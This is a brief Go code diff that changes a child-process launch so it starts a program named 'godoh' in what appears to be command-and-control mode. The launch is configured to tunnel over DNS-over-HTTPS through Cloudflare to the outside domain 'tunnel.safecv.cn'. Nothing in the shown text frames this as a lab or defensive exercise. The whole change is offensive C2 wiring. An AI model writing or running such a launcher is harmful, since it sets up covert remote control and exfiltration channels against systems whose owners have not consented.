@@ -8,7 +8,7 @@ import (
 )
 
 func main() {
-	p, err := child.CreateChildProcess(`./godoh`)
+	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "tunnel.safecv.cn", "-p", "cloudflare")
 	if err != nil {
 		panic(err)
 	}
